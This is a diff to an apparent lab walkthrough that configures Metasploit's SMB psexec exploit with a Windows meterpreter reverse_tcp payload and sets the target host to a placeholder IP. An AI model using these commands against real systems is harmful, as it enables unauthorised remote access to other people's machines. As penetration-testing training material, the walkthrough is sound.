@@ -107,14 +107,17 @@ use exploit/windows/smb/psexec
 We will continue by running this command to set the location of the payload:
 
 ```bash
-set windows/x64/meterpreter/reverse_tcp)
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
 ```
 
 We also need to set the **RHOST IP** for the Windows system by using the following command:
 
 ```bash
-set RHOST win.cloudlab.lan
+set RHOST <WIN IP>
 ```
+
+>[!IMPORNANT]
+>Your IP will differ
 
 <img width="711" height="108" alt="2026-03-15_23-39" src="https://github.com/user-attachments/assets/68a2b59f-01ae-4500-88cc-563275be4cb7" />
 
